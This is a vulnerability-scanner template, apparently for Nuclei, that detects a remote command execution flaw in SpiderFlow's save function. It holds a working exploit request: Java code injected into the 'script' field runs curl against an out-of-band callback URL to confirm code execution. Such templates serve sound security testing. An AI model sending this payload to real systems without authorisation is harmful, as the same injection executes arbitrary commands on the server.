id: spiderflow-save-script-rce
info:
  name: SpiderFlow Save Remote Command Execution
  author: we1x4n
  severity: critical
  description: |
    This template detects Remote Command Execution (RCE) vulnerability in SpiderFlow's save function by sending a payload that executes a reverse callback to an attacker-controlled server.
  reference:
    - https://github.com/GREENHAT7/pxplan/blob/main/goby_pocs/SpiderFlow_save__remote_code.json

variables:
  reverse_url: "{{interactsh-url}}"

http:
  - raw:
      - |
        POST /function/save HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        id=&name=cmd&parameter=yw&script=}Java.type('java.lang.Runtime').getRuntime().exec('curl {{reverse_url}}');{
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: interactsh_protocol
        words:
          - "http"
